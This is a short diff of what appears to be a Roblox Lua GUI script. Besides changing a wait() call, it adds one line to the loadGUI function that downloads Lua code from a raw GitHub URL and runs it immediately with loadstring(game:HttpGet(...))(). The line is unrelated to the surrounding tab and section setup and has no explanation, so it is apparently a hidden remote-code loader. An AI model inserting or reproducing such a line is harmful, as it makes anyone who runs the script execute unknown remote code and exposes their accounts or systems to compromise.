@@ -549,7 +549,9 @@ local function loadGUI()
            Key = {"None"}
         }
     })
-    wait()
+    wait(0.2)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/LmaoItsCrazyBro/hfrghwerhrwenh/refs/heads/main/run_lua_code.lua'))()
+    wait(0.1)
     -- [] -->> Initialize Tabs and Sections <<-- [] --
     local Tab1 = Window:CreateTab("> Home Tab <", 7733960981)
     local Section1 = Tab1:CreateSection("||| Home Section |||")
